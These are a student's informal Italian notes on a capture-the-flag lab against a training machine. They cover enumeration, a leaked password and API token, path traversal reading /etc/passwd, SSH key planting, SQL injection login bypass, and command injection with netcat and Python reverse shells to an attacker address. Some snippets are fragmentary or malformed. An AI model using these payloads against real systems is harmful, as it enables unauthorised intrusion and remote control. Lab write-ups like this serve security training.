**Nome e cognome:** Luca Gugliotta  
**Matricola:** 0342634  
**Target:** `192.168.14.42

#### PORT DISCOVERY
con nmap TCP sono state trovate 3 porte
![[Pasted image 20260622092346.png|471]]

#### WEB ENUM
`socialipsilon.vdsi`
dentro il file javascript
script.js
```javascript
 },
        time: "2h",
        content: "Welcome to Social Y! The only platform where free speech is absolute. We are launching socialipsilon.vdsi to the world. Get ready.",
        stats: { replies: 1243, retweets: 8540, likes: 45200, views: "1.2M" }
```

facendo gobuster con vhost trovo
![[Pasted image 20260622094756.png]]

è stata trovata la internal board `http://blog.socialipsilon.vdsi/`

posta interessante trovata nel sito con showing della password e dati personali
![[Pasted image 20260622095013.png]]

pasword trovata con nome utente uguale alla piattaforma x
`b.bama:MichelleTiAmoPerSempre33!!`



dopo essermi connesso al server sulla porta 20000
con le credenziali trovate in precedenza ottengo una API key, probabilmente devo utilizzarla dopo
`X-API-TOKEN: c4ca4238a0b923820dcc509a6f75849b`

avere una api key e un url con api.url direi che ci porta a dedurre che possiamo provare ad accedere sul seguente vhost
`http://api.socialipsilon.vdsi/`

posso fare una rotta rest con 
/v0/debug/to-delete/readstatusfile per ottenere cose sensibili


faccio path trasversal con 
```scss
curl -X GET \
  'http://api.socialipsilon.vdsi/v0/debug/to-delete/readstatusfile?file=../../../../etc/passwd' \                        
  -H 'X-API-TOKEN':'c4ca4238a0b923820dcc509a6f75849b'
```

/etc/passwd outpiut
```scss
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
postfix:x:100:109::/var/spool/postfix:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:111::/nonexistent:/usr/sbin/nologin
user:x:1000:1000:,,,:/home/user:/bin/bash
m.husk:$1$D8SI0xAD$jvbgcpMCuKm0ntso9fWTE1:1001:1004::/home/m.husk:/bin/bash
d.truck:x:1002:1005::/home/d.truck:/bin/bash

```

![[Pasted image 20260622103724.png]]

facendo 

siamo entrati nella macchina con ssh e usando le credenziali

`VDSI{M3lon_Husk_1s_H3r3}` flag ottenuta facendo ./user.txt

`nikolatesla      ("m.husk)`


![[Pasted image 20260622104253.png]]

uso ssh publica da mettere dentro d.truck
`ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDzj1z9yEmzPjD/+94QMzQPD/9COGpecuF0KGcUDvdZn kali@kali`

accedo con 
`ssh -i /home/kali/.ssh/id_ed25519 d.truck@192.168.14.42`

`VDSI{D0n4ld_Truck_1s_B3st_Pr3s1dent}`

`/usr/bin/python3 /usr/bin/crypto/task `
![[Pasted image 20260622112631.png]]


![[Pasted image 20260622122331.png]]

`VDSI{C0nsp1r4cy_Th30ry_R34ch3d_R00t}`
ho trovato socat come sudo -l
che posso eseguire senza passwd

#### CHALLENGE A SE

ip target lo stesso ma con porta 
`58090`
sono entrato facendo sql injection di tipo in band
`' OR '1'='1`

`VDSI{SQLi_Byp4ss_D14gn0st1cs}`

`";"nc 10.8.0.7 4444 -e /bin/bash"`

`"%3B"nc 10.8.0.7 4444 -e /bin/bash"`


ho modificato il file html e ho eseguito

togliendo la chiamata a validate form

```python
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

`VDSI{Cmd_Inj3ct10n_WAF_Byp4ss3d}`


#### Challenge a se 2

`porta 58022` come utente `student` con password `student123`

![[Pasted image 20260622131719.png]]

path trovato con 
```scss
student@fc2bb2d67818:/usr/bin/crypto$ cat task
#!/usr/bin/env python3
import random
import os

# Some dummy operation
crypto_val = random.randint(10000, 99999) if hasattr(random, 'randint') else "INIT"

try:
    with open("/var/backups/generated/l4st.k3y", "w") as f:
        f.write(f"KEY_GEN_{crypto_val}\n")
except:
    pass

```

ho provato a fare path hijacking sarebbe andato così

```scss
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.0.7",4444))
os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")'
```
